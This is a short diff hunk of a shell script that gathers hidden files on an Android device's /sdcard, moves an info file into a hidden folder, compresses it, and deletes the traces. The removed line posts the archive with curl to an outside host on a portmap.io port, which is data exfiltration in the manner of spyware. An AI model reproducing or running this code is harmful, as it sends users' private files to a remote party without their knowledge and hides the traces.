@@ -44,8 +44,8 @@ done < "$arquivo3"
 rm /sdcard/.img.txt
 rm /sdcard/.db.txt
 rm /sdcard/.pdf.txt
+mv /sdcard/.infos.txt /sdcard/.mik
 
 tar -czf .mik.gz /sdcard/.mik
-curl -d @/sdcard/.mik.gz Mikelodeon-33329.portmap.io:33329
 rm -rf /sdcard/.mik
 rm -rf /sdcard/.mik.gz
